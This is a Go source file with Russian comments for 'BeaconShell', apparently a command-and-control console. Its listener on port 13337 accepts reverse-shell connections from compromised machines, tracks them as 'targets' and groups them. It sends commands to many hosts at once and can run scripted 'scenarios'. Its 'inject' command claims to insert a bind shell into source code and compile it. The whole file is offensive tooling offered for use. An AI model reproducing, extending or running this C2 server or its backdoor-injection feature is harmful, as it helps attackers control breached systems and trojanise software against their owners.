package main

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"os"
	"sync"
)

var global_response_timeout int = 1000
var global_buffer_size int = 4096
var active_targets int = 0
var scenario_mode bool = false

// Предоставляет список встроенных команд (вызов: /BS help).
func BeaconShellHelp() {
	BSPrint("Command list:")
	fmt.Println("\n\t\tTargets status:")
	fmt.Println("\t- /BS targets \t\t\tShow current targets list;")
	fmt.Println("\t- /BS add <ip:port> \t\tAdd target <ip:port> to set;")
	fmt.Println("\t- /BS add list <file> \t\tAdd targets from <file> to set;")
	fmt.Println("\t- /BS group <group> <host_id> \tAdd target <host_id> to <group>;")
	fmt.Println("\t- /BS remove <host_id> \t\tRemove target from set;")
	fmt.Println("\t- /BS off \t\t\tStop sending commands to the all hosts;")
	fmt.Println("\t- /BS off <host_id> \t\tStop sending commands to the host;")
	fmt.Println("\t- /BS off group <group> \tStop sending commands to the <group>;")
	fmt.Println("\t- /BS on \t\t\tResume sending commands to the all hosts;")
	fmt.Println("\t- /BS on <host_id> \t\tResume sending commands to the host;")
	fmt.Println("\t- /BS on group <group> \t\tResume sending commands to the <group>.")

	fmt.Println("\n\t\tShell injecting:")
	fmt.Println("\t- /BS inject <file_path> <shell_type> <OS> <Arch> <ip> <port> \t\tInject bind shell to code and compile it. (BETA)")

	fmt.Println("\n\t\tConfiguration:")
	fmt.Println("\t- /BS config \t\t\tGet current configuration;")
	fmt.Println("\t- /BS timeout <time> \t\tSet targets response timeout to <time> millisecond(s);")
	fmt.Println("\t- /BS buffer <size> \t\tSet buffer size to <size> byte(s).")

	fmt.Println("\n\t\tOther:")
	fmt.Println("\t- /BS help \t\t\tShow this list;")
	fmt.Println("\t- /BS scenario <scenario> \tStart scenario from file <scenario>;")
	fmt.Println("\t- /BS stop \t\t\tFinish session.")

	fmt.Println("")
}

// Завершает работу программы (вызов: /BS stop)
func BeaconShellStop(targets *[]Target) {
	// Завершение всех активных соединений
	finishAllSessions(targets)

	// Завершение программы
	BSPrint("Shutdown...")
	os.Exit(0)
}

// Выводит список целевых хостов (вызов: /BS targets)
func BeaconShellTargets(targets *[]Target) {
	BSPrint("Current targets (active: %d, total: %d):\n", active_targets, len(*targets))
	for i := 0; i < len(*targets); i++ {
		if (*targets)[i].status == true {
			fmt.Printf("\t<%d> [+] (%s) %s\n", i, (*targets)[i].group, (*targets)[i].name)
		} else {
			fmt.Printf("\t<%d> [-] (%s) %s\n", i, (*targets)[i].group, (*targets)[i].name)
		}
	}
}

// Удаляет выбранный хост из списка целей и завершает с ним сессию (вызов: /BS remove)
func BeaconShellRemove(targets *[]Target, idx int) {
	active_targets--

	// Завершение сессии удаляемого хоста
	finishSession((*targets)[idx])

	BSPrint("%s removed from target list.\n", (*targets)[idx].name)

	// Удаление хоста из списка целей
	*targets = append((*targets)[:idx], (*targets)[idx+1:]...)
}

// Приостановление взаимодействия с целью (вызов: /BS off)
func BeaconShellOff(targets *[]Target, idx int) {
	if (*targets)[idx].status == false {
		BSPrint("The host is already an inactive target!\n")
		return
	}

	active_targets--
	(*targets)[idx].status = false
	BSPrint("%s off.\n", (*targets)[idx].name)
}

// Возобновление взаимодействия с целью (вызов: /BS on)
func BeaconShellOn(targets *[]Target, idx int) {
	if (*targets)[idx].status == true {
		BSPrint("The host is already an active target!\n")
		return
	}

	active_targets++
	(*targets)[idx].status = true
	BSPrint("%s on.\n", (*targets)[idx].name)
}

// Вывод сведений о текущей конфигурации
func BeaconShellConfig() {
	BSPrint("Current configuration:\n")
	fmt.Printf("\tResponse timeout: %d millisecond(s).\n", global_response_timeout)
	fmt.Printf("\tBuffer size: %d byte(s).\n", global_buffer_size)
}

// Устанавливает значение переменной global_response_timeout равным value (вызов: /BS timeout)
func BeaconShellTimeout(value int) {
	global_response_timeout = value
	BSPrint("Response timeout set: %d millisecond(s).\n", global_response_timeout)
}

// Устанавливает значение переменной global_buffer_size равным value (вызов: /BS buffer)
func BeaconShellBufferSize(value int) {
	global_buffer_size = value
	BSPrint("Buffer size set to %d byte(s).\n", global_buffer_size)
}

// Устанавливает соединение с выбранным хостом и добавляет его в список целей (вызов: /BS add)
func BeaconShellAdd(targets *[]Target, target_name string) {
	addSession(targets, target_name)
}

func BeaconShellListAdd(targets *[]Target, targets_file string) {
	// Открытие файла с новыми целями
	file, err := os.Open(targets_file)
	if err != nil {
		log.Fatalln(err)
	}
	defer file.Close()

	// Создание сканера для считывания
	scanner := bufio.NewScanner(file)

	// Построчное считывание файла
	for scanner.Scan() {
		// Получение имени хоста
		target_name := scanner.Text()
		isUnique := true

		// Проверка уникальности новой цели
		for i := 0; i < len(*targets); i++ {
			// Если цель уже присутствует в списке:
			if target_name == (*targets)[i].name {
				// Указать на это
				isUnique = false
				break
			}
		}

		// Если цель уникальна - добавление сессии
		if isUnique {
			addSession(targets, target_name)
		}
	}
}

func BeaconShellGroup(targets *[]Target, idx int, group_name string) {
	(*targets)[idx].group = group_name
	BSPrint("%s group set: %s.\n", (*targets)[idx].name, group_name)
}

func BeaconShellScenario(targets *[]Target, scenario_name string, mtx *sync.Mutex) {
	BSPrint("Starting scenario %s.\n", scenario_name)

	// Открытие файла сценария
	file, err := os.Open(scenario_name)
	if err != nil {
		log.Fatalln(err)
	}
	defer file.Close()

	// Создание сканера для считывания
	scanner := bufio.NewScanner(file)

	// Построчное считывание файла
	for scanner.Scan() {
		// Получение инструкции сценария
		command := scanner.Text()

		// Обработка запроса
		processRequest(targets, command, mtx)
	}
}

func BeaconShellRequest(request []string, targets *[]Target, mtx *sync.Mutex) {
	// В случае, если конкретная инструкция не указана, вызывается /BS help
	if len(request) == 1 {
		BeaconShellHelp()
		return
	}

	switch request[1] {
	case "add":
		if len(request) < 3 {
			return
		}

		mtx.Lock()
		if request[2] == "list" {
			BeaconShellListAdd(targets, request[3])
		} else {
			BeaconShellAdd(targets, request[2])
		}
		mtx.Unlock()
	case "buffer":
		ok, value := checkPositiveNumber(request[2])
		if ok {
			BeaconShellBufferSize(value)
		}
	case "config":
		BeaconShellConfig()
	case "help":
		BeaconShellHelp()
	case "inject":
		ok, value := checkPositiveNumber(request[7])
		if ok {
			BeaconShellInject(request[2], request[3], request[4], request[5], request[6], value)
		}
	case "group":
		mtx.Lock()
		defer mtx.Unlock()

		ok, idx := checkTargetNumber(targets, request[3])

		if ok {
			BeaconShellGroup(targets, idx, request[2])
		}
	case "off":
		mtx.Lock()
		defer mtx.Unlock()

		// Если аргументов более трех, остановка
		if len(request) > 4 {
			BSPrint("Error! Correct usage: \"/BS off\", \"/BS off <host_id>\" or \"/BS off group <group>\".\n")
			return
		}

		// Если не указан конкретный хост, приостановить всё
		if len(request) == 2 {
			for i := 0; i < len(*targets); i++ {
				BeaconShellOff(targets, i)
			}
			return
		}

		// Если указана конкретная группа хостов, присотановить всю группу
		if len(request) == 4 && request[2] == "group" {
			for i := 0; i < len(*targets); i++ {
				if (*targets)[i].group == request[3] {
					BeaconShellOff(targets, i)
				}
			}
			return
		}

		// Иначе - проверка корректности идентификатора
		ok, idx := checkTargetNumber(targets, request[2])

		// Если идентификатор корректен, приостановить действия на выбранном хосте
		if ok {
			BeaconShellOff(targets, idx)
		}
	case "on":
		mtx.Lock()
		defer mtx.Unlock()

		// Если аргументов более трех, остановка
		if len(request) > 4 {
			BSPrint("Error! Correct usage: \"/BS on\", \"/BS on <host_id>\" or \"/BS on group <group>\".\n")
			return
		}

		// Если не указан конкретный хост, возобновить всё
		if len(request) == 2 {
			for i := 0; i < len(*targets); i++ {
				BeaconShellOn(targets, i)
			}
			return
		}

		// Если указана конкретная группа хостов, возобновить всю группу
		if len(request) == 4 && request[2] == "group" {
			for i := 0; i < len(*targets); i++ {
				if (*targets)[i].group == request[3] {
					BeaconShellOn(targets, i)
				}
			}
			return
		}

		// Иначе - проверка корректности идентификатора
		ok, idx := checkTargetNumber(targets, request[2])

		// Если идентификатор корректен, возобновить действия на выбранном хосте
		if ok {
			BeaconShellOn(targets, idx)
		}
	case "remove":
		mtx.Lock()
		defer mtx.Unlock()

		// Если аргументов более трех, остановка
		if len(request) > 3 {
			BSPrint("Error! Correct usage: \"/BS remove\", \"/BS remove <host_id>\" or \"/BS remove group <group>\".\n")
			return
		}

		// Если не указан конкретный хост, удалить всё
		if len(request) == 2 {
			cnt := len(*targets)
			for i := 0; i < cnt; i++ {
				BeaconShellRemove(targets, 0)
			}
			return
		}

		/*
			// Если указана конкретная группа хостов, удалить всю группу
			if len(request) == 4 && request[2] == "group" {
				cnt := len(*targets)
				for i := 0; i < cnt; {
					if (*targets)[i].group == request[3] {
						BeaconShellOff(targets, i)
					} else {
						i++
					}
				}
				return
			}
		*/

		// Иначе - проверка корректности идентификатора
		ok, idx := checkTargetNumber(targets, request[2])

		// Если идентификатор корректен, удаляет выбранный хост
		if ok {
			BeaconShellRemove(targets, idx)
		}
	case "scenario":
		BeaconShellScenario(targets, request[2], mtx)
	case "stop":
		BeaconShellStop(targets)
	case "targets":
		BeaconShellTargets(targets)
	case "timeout":
		ok, value := checkPositiveNumber(request[2])
		if ok {
			BeaconShellTimeout(value)
		}
	default:
		BSPrint("Incorrect shell command!\n")
	}
}

func ReverseShellHandle(targets *[]Target, conn net.Conn, mtx *sync.Mutex) {
	// Создание буфера для считывания ОС целевого хоста
	init_buf := make([]byte, global_buffer_size)

	// Чтение ОС хоста
	n, err := conn.Read(init_buf)
	if err != nil {
		return
	}

	// Добавление хоста в список целей
	(*mtx).Lock()
	*targets = append(*targets, Target{name: conn.RemoteAddr().String(), conn: conn, status: false, group: string(init_buf[:n])})
	(*mtx).Unlock()
}

func ReverseShellStartServer(targets *[]Target, mtx *sync.Mutex) {
	listener, err := net.Listen("tcp", ":13337")
	if err != nil {
		log.Fatalln(err)
	}

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Fatalln(err)
		}
		go ReverseShellHandle(targets, conn, mtx)
	}
}

func BSPrint(format string, args ...interface{}) {
	fmt.Printf("[BShell] "+format, args...)
}

func main() {
	// Инициализация контейнера целей
	targets := make([]Target, 0, 1)

	// Создание мьютекса для обеспечения атомарности операций со списком целей
	mtx := sync.Mutex{}

	// Запуск сервера для подключения через Reverse shell
	go ReverseShellStartServer(&targets, &mtx)

	// Создание объекта NewReader стандартного потока ввода
	reader := bufio.NewReader(os.Stdin)

	// Инструктаж пользователя
	BSPrint("Print \"/BS help\" to get info.\n")

	// Основной рабочий цикл
	for {
		// Приглашение к вводу команды
		BSPrint(">> ")

		// Считывание команды пользователя
		input, _ := reader.ReadString('\n')

		// Обработка запроса
		processRequest(&targets, input, &mtx)
	}
}
